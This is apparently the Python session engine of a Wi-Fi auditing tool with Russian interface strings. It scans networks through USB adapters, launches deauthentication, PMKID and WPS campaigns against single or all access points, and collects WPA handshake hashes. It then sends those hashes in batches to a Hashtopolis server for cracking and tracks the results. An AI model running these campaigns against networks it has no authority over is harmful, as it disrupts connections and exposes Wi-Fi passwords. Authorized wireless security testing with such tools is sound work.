"""Session engine: passive survey + authorized deauth + hc22000 collection.

Live radio work is delegated to the pinned upstream (WlanArray, DeauthCampaign,
hc22000 serialisers); DEMO mode exercises the same API surface with synthetic
data and never imports upstream.
"""
from __future__ import annotations
import asyncio
from collections import deque
from datetime import datetime, timezone
import time

from . import hashes as hashcollect
from . import hashtopolis
from . import __version__
from .attacks import CampaignControl
from .observation import DisconnectObservations

UPSTREAM_COMMIT = "04a4e2b6e3d6d54b7befd526bdb7232694ec49ea"


def utcnow():
    return datetime.now(timezone.utc).isoformat()


def device_key(d):
    return f"{d.vid:04x}:{d.pid:04x}:{d.bus}:{d.address}"


def serialize_ap(ap, clients):
    handshakes = {}
    try:
        handshakes = dict(ap.handshakes)
    except (AttributeError, RuntimeError, TypeError):
        pass
    captures, pmkid = 0, False
    akm = set(getattr(ap, "akm_suites", None) or [])
    if handshakes or akm:
        try:                                  # live implies upstream is installed
            from wifit3.crack.handshake import crackable_captures, PSK_CAPTURE_AKMS
            captures = len(crackable_captures(ap))
            pmkid = any(getattr(hs, "pmkid", None) for hs in handshakes.values())
            psk_family = bool(PSK_CAPTURE_AKMS & akm)
        except ImportError:
            psk_family = bool(akm)
    else:
        psk_family = bool(akm)
    return {
        "bssid": ap.bssid, "ssid": ap.ssid or "", "channel": ap.channel,
        "encryption": ap.encryption or "Unknown", "signal": ap.signal,
        "beacons": ap.beacons, "last_seen": ap.last_seen,
        "age_seconds": max(0, round(time.time() - ap.last_seen)),
        "wps": ap.wps, "wps_locked": ap.wps_locked,
        "pmf_capable": ap.pmf_capable, "pmf_required": ap.pmf_required,
        "wpa3": ap.wpa3, "transition_mode": ap.transition_mode,
        "vendor": ap.identity.manufacturer or "",
        "captures": captures, "pmkid": pmkid, "psk_family": psk_family,
        "hidden": bool(getattr(ap, "is_hidden", False)),
        "rsn_valid": bool(getattr(ap, "rsn_valid", False)),
        "clients": [{"mac": c.mac, "signal": c.signal, "packets": c.packets}
                    for c in list(clients.values()) if c.bssid == ap.bssid],
    }


class Engine:
    def __init__(self, demo=False, state_dir=None):
        self.demo = demo
        self.instance_id = None
        self.state_dir = state_dir
        self.disconnect_observations = DisconnectObservations()
        self.attack = CampaignControl(self)
        self.demo_captures: dict[str, list[str]] = {}
        self._hash_cache: dict[str, list[str]] = {}
        self.htp_submitted: list[dict] = []      # hashlists sent this session (crack tracking)
        self.htp_last: dict | None = None        # last hashtopolis_send summary
        self.phase = "idle"
        self.error = ""
        self.progress = "Подключите USB-адаптер и обновите список."
        self.devices = []
        self._device_map = {}
        self.array = None
        self.networks = []
        self.logs = deque(maxlen=150)
        self._connect_task = None
        self._lock = asyncio.Lock()
        self._loop = None
        self.band = "all"
        self._hop_channels = None
        self._hop_interval = 0.5
        self.started_at = None
        self.last_snapshot_at = None
        self.log("Модуль готов. Активные действия — только по разрешению на аудит.")

    def log(self, message):
        self.logs.append({"time": utcnow(), "message": str(message)[:1000]})

    async def refresh(self):
        async with self._lock:
            if self.phase in ("starting", "stopping"):
                raise ValueError("Дождитесь завершения подключения/остановки.")
            if self.demo:
                self.devices = [{"id": "demo", "name": "Demo · RTL8821AU", "chipset": "RTL8821AU",
                                 "usb": "DEMO", "active": self.phase == "scanning"}]
            else:
                # Imports are lazy: demo and the app still work without upstream installed.
                try:
                    from wifit3.device.manager import devices
                except ModuleNotFoundError as exc:
                    raise RuntimeError("USB-драйвер не установлен. Установите пакет с extra [usb] или используйте --demo; см. README.") from exc
                from wifit3.device.backend import usb_backend
                found = await asyncio.to_thread(devices)
                self._device_map = {device_key(d): d for d in found}
                self.devices = [{"id": device_key(d), "name": d.description, "chipset": d.chipset,
                                 "usb": f"{d.vid:04x}:{d.pid:04x}", "active": bool(self.array and self.array.contains(d))}
                                for d in found]
                hint = usb_backend().status_hint()
                if hint:
                    self.log(hint)
                    self.progress = hint
            self.log(f"Найдено адаптеров: {len(self.devices)}")
            return self.snapshot()

    async def start(self, device_id, band):
        async with self._lock:
            if self.phase in ("starting", "scanning", "stopping"):
                raise ValueError("Сессия уже запущена или меняет состояние.")
            if self.array is not None:
                raise ValueError("Сначала нажмите Стоп, чтобы освободить предыдущую сессию.")
            if band not in ("all", "2g", "5g"):
                raise ValueError("Неизвестный диапазон.")
            if device_id not in {d["id"] for d in self.devices}:
                raise ValueError("Обновите список и выберите доступный адаптер.")
            self.disconnect_observations = DisconnectObservations()
            self.demo_captures = {}
            self._hash_cache = {}
            self.htp_submitted = []
            self.htp_last = None
            self.attack.reset()
            self.phase, self.error, self.band = "starting", "", band
            self.progress = "Инициализация адаптера…"
            self._loop = asyncio.get_running_loop()
            self._connect_task = asyncio.create_task(self._connect(device_id))
            return self.snapshot()

    async def _connect(self, device_id):
        iface = None
        try:
            if self.demo:
                self.networks = [n for n in self.demo_networks() if self.band == "all" or (self.band == "2g" and n["channel"] <= 14) or (self.band == "5g" and n["channel"] > 14)]
            else:
                from wifit3.device.manager import wlan_iface
                from wifit3.wlan.array import WlanArray
                iface = wlan_iface(self._device_map[device_id])
                if iface is None:
                    raise RuntimeError("Адаптер отключён. Обновите список устройств.")
                def progress(percent, message):
                    self._loop.call_soon_threadsafe(self._set_progress, str(message))
                if not await iface.connect(progress_cb=progress):
                    raise RuntimeError("Драйвер не смог подключить адаптер.")
                channels = [c for c in iface.supported_channels
                            if self.band == "all" or (self.band == "2g" and c <= 14)
                            or (self.band == "5g" and c > 14)]
                if not channels:
                    raise ValueError("Адаптер не поддерживает выбранный диапазон.")
                self.array = WlanArray()
                self.array.register_disconnect_callback(self._device_lost)
                iface.register_rx_callback(self.disconnect_observations.receive)
                self.array.attach(iface)
                self._hop_channels = channels
                self._hop_interval = 0.5
                await self.array.start_hopping(channels=channels, interval=self._hop_interval)
            self.phase = "scanning"
            self.started_at = utcnow()
            self.error = ""
            self.progress = "Пассивное сканирование"
            for d in self.devices:
                d["active"] = d["id"] == device_id
            self.log("Сканирование запущено" + (" (DEMO — вымышленные данные)" if self.demo else ""))
        except BaseException as exc:
            try:
                if self.array:
                    await self.array.close()
                    self.array = None
                elif iface:
                    await iface.close()
            except Exception as cleanup_error:
                self.log("Ошибка освобождения USB: " + str(cleanup_error))
            if isinstance(exc, asyncio.CancelledError):
                raise
            self.phase = "error"
            self.error = str(exc) or type(exc).__name__
            self.log(self.error)
        finally:
            self._connect_task = None

    def _set_progress(self, text):
        self.progress = text[:500]

    def _device_lost(self, exc, remaining):
        if self._loop:
            self._loop.call_soon_threadsafe(self._lost_on_loop, str(exc or "USB отключён"), remaining)

    def _lost_on_loop(self, message, remaining):
        self.log("Адаптер отключён: " + message)
        if not remaining and self.phase == "scanning":
            self.phase = "error"
            self.error = "USB-адаптер отключён. Нажмите Стоп, подключите его и обновите список."

    def _capture_snapshot(self):
        if self.array:
            # Drivers feed upstream registries from an RX thread; freeze dict membership before iterating.
            clients = dict(self.array.clients)
            self.networks = [serialize_ap(ap, clients) for ap in list(self.array.access_points.values())]
            self.last_snapshot_at = utcnow()
        elif self.demo and self.phase == "scanning":
            self.last_snapshot_at = utcnow()

    def _refresh_hashes(self):
        """Re-collect while scanning (cheap); otherwise keep the last cache."""
        if self.phase == "scanning":
            if self.demo:
                self._hash_cache = hashcollect.collect_demo(self)
            elif self.array is not None:
                self._hash_cache = hashcollect.collect_from_array(self.array)
        return self._hash_cache

    def register_demo_capture(self, bssid, line):
        self.demo_captures.setdefault(bssid, []).append(line)
        for n in self.networks:
            if n["bssid"] == bssid:
                n["captures"] = len(self.demo_captures[bssid])
                n["pmkid"] = True
        self._hash_cache = hashcollect.collect_demo(self)

    def hash_lines(self):
        return hashcollect.unique_lines(self._refresh_hashes())

    # ---- active campaigns (deauth / PMKID / WPS) --------------------------
    async def start_attack(self, campaign, bssid, authorized):
        if authorized is not True:
            raise ValueError("Подтвердите право на аудит оборудования.")
        await self.attack.start(campaign, bssid)
        return self.snapshot()          # every POST action returns the full state (UI contract)

    async def start_deauth(self, bssid, authorized):
        return await self.start_attack("deauth", bssid, authorized)

    async def start_attack_all(self, campaign, authorized):
        if authorized is not True:
            raise ValueError("Подтвердите право на аудит оборудования.")
        await self.attack.start_all(campaign, authorized)
        return self.snapshot()

    async def stop_attack(self):
        await self.attack.stop()
        return self.snapshot()

    async def stop_deauth(self):
        return await self.stop_attack()

    # ---- Hashtopolis -----------------------------------------------------
    def htp_state(self):
        cfg = hashtopolis.load_config(self.state_dir) if self.state_dir else {}
        return {"url": cfg.get("url", ""), "user": cfg.get("user", ""),
                "has_token": bool(cfg.get("token")), "demo": self.demo,
                "submitted": [dict(e) for e in self.htp_submitted],
                "last": self.htp_last}

    def htp_save(self, url, token="", user=""):
        if not self.state_dir:
            raise RuntimeError("Нет приватного каталога состояния — конфиг некуда сохранить.")
        url = (url or "").strip().rstrip("/")
        if not url.lower().startswith(("http://", "https://")):
            raise ValueError("URL должен начинаться с http:// или https://.")
        hashtopolis.save_config(self.state_dir, url=url, token=token.strip(), user=user.strip())
        self.log("Конфиг Hashtopolis сохранён в приватный каталог.")
        return self.htp_state()

    def htp_clear(self):
        if self.state_dir:
            hashtopolis.clear_config(self.state_dir)
        self.log("Сохранённый конфиг Hashtopolis удалён.")
        return self.htp_state()

    def _htp_client(self, url, token, user, password):
        saved = hashtopolis.load_config(self.state_dir) if self.state_dir else {}
        resolved_url = (url or "").strip() or saved.get("url", "")
        if not resolved_url.lower().startswith(("http://", "https://")):
            raise ValueError("Укажите URL Hashtopolis (http:// или https://).")
        resolved_user = (user or "").strip() or saved.get("user", "")
        resolved_token = (token or "").strip() or ("" if password else saved.get("token", ""))
        return hashtopolis.HashtopolisClient(resolved_url, token=resolved_token,
                                             user=resolved_user, password=password), resolved_url

    async def hashtopolis_test(self, url="", token="", user="", password=""):
        client, resolved_url = self._htp_client(url, token, user, password)
        result = await asyncio.to_thread(client.verify)
        return {"url": resolved_url, **result}

    async def hashtopolis_send(self, *, url="", token="", user="", password="",
                               batch=250, access_group=1, tag="hs-mobile", note="",
                               pretask_ids=None, all_wpa=False, dry_run=False):
        lines = hashcollect.unique_lines(self._refresh_hashes())
        if not lines:
            raise ValueError("Крэкабельных хешей нет: сначала получите хендшейк или PMKID.")
        if dry_run is False and self.demo:
            raise ValueError("DEMO: реальные отправки отключены (данные вымышленные). Доступен dry-run.")
        client, resolved_url = self._htp_client(url, token, user, password)
        batch_list = hashcollect.batches(lines, batch)
        if dry_run:
            return {"dry_run": True, "url": resolved_url, "total": len(lines),
                    "batches": [{"name_hint": i, "count": len(b)} for i, b in enumerate(batch_list, 1)]}
        def work():
            server_pretasks = client.pretasks()
            chain = hashtopolis.select_pretasks(server_pretasks, pretask_ids, all_wpa)
            binary_id, version = client.newest_binary()
            stamp = time.strftime("%Y%m%d-%H%M%S")
            results = []
            for i, chunk in enumerate(batch_list, 1):
                name = f"{tag}-{stamp}-{i:03d}"
                hl_id = client.create_hashlist(name, chunk, int(access_group) or 1, note)
                task_ids = []
                for pt in chain:
                    pt_name = pt["attributes"]["taskName"].replace("WPA2 | ", "").strip()
                    task_ids.append(client.create_task_from_pretask(
                        pt, hl_id, binary_id, f"{name} | {pt_name}"))
                results.append({"hashlist": hl_id, "name": name, "count": len(chunk),
                                "tasks": task_ids})
                self.log(f"Hashtopolis: батч {i}/{len(batch_list)} → hashlist {hl_id} "
                         f"({len(chunk)} хешей), задач: {len(task_ids)}")
            return {"url": resolved_url, "hashcat": version,
                    "chain": [pt["attributes"]["taskName"] for pt in chain],
                    "batches": results, "total": len(lines)}
        self.log(f"Hashtopolis: отправка {len(lines)} хешей ({len(batch_list)} батч(ей)) на {resolved_url}")
        result = await asyncio.to_thread(work)
        # Book the submission so the UI can track crack progress across reloads.
        self.htp_submitted = self.htp_submitted + [
            {"hashlist": b["hashlist"], "name": b["name"], "count": b["count"],
             "tasks": b["tasks"], "cracked": 0, "total": b["count"]}
            for b in result["batches"]]
        self.htp_last = {"at": utcnow(), "url": result["url"], "hashcat": result["hashcat"],
                         "chain": result["chain"], "total": result["total"],
                         "hashlists": [b["hashlist"] for b in result["batches"]]}
        return result

    async def hashtopolis_status(self, url="", token="", user="", password=""):
        """Refresh cracked/total for every hashlist submitted this session."""
        if not self.htp_submitted:
            return {"submitted": [], "cracked": 0, "total": 0}
        client, resolved_url = self._htp_client(url, token, user, password)
        def work(entry):
            cracked, total = client.hashlist_state(entry["hashlist"])
            entry["cracked"], entry["total"] = cracked, total
        for entry in self.htp_submitted:
            await asyncio.to_thread(work, entry)
        cracked = sum(e["cracked"] for e in self.htp_submitted)
        total = sum(e["total"] for e in self.htp_submitted)
        self.log(f"Hashtopolis: статус — взломано {cracked} из {total} хешей.")
        return {"url": resolved_url, "submitted": [dict(e) for e in self.htp_submitted],
                "cracked": cracked, "total": total}

    async def stop(self):
        async with self._lock:
            self.phase = "stopping"
            try:
                await self.attack.stop()
            except Exception as exc:
                self.log("Ошибка остановки deauth: " + str(exc))
            if self._connect_task:
                task = self._connect_task
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
                self._connect_task = None
            self._capture_snapshot()
            if self.array:
                await self.array.close()
                self.array = None
            self.phase, self.error = "idle", ""
            self.progress = "Сессия остановлена. Ниже — последний снимок."
            for d in self.devices:
                d["active"] = False
            self.log("Приём остановлен; USB освобождён.")
            return self.snapshot()

    def snapshot(self):
        if self.phase == "scanning":
            self._capture_snapshot()
        return {"version": __version__, "instance_id": self.instance_id, "upstream_commit": UPSTREAM_COMMIT, "demo": self.demo,
                "phase": self.phase, "progress": self.progress, "error": self.error,
                "band": self.band, "started_at": self.started_at,
                "snapshot_at": self.last_snapshot_at, "now": utcnow(),
                "devices": self.devices, "networks": self.networks,
                "logs": list(self.logs),
                "passive_only": False,
                "audit": True,
                "attack": self.attack.snapshot(),
                "deauth": self.attack.snapshot(),   # legacy alias (pre-0.4.2 consumers)
                "hashes": hashcollect.summarize(self._refresh_hashes()),
                "htp": self.htp_state(),
                "disconnect_observations": self.disconnect_observations.snapshot()}

    @staticmethod
    def demo_networks():
        result = []
        for i, (ssid, ch, signal, enc, vendor, wps) in enumerate([
            ("Studio / Lab", 36, -42, "WPA2/WPA3", "Example router", False),
            ("Home Network", 6, -56, "WPA2", "Example router", True),
            ("", 11, -68, "WPA2", "", False),
            ("Guest Wi-Fi", 1, -77, "OPEN", "", False),
        ]):
            result.append({"bssid": f"02:00:00:00:00:{i+1:02x}", "ssid": ssid, "channel": ch,
                           "signal": signal, "encryption": enc, "vendor": vendor, "wps": wps,
                           "wps_locked": False, "pmf_capable": i == 0, "pmf_required": False,
                           "wpa3": i == 0, "transition_mode": i == 0,
                           "beacons": 143 + 19*i, "last_seen": time.time(), "age_seconds": 0,
                           "captures": 0, "pmkid": False,
                           "psk_family": enc != "OPEN",
                           "hidden": ssid == "", "rsn_valid": enc != "OPEN",
                           # synthetic clients so sweep/filter demo flows have targets
                           "clients": ([] if enc == "OPEN" or i == 2 else
                                       [{"mac": f"02:00:00:00:0{1+i}:aa", "signal": -52 - 3*i,
                                         "packets": 100 + 17*i}])})
        return result
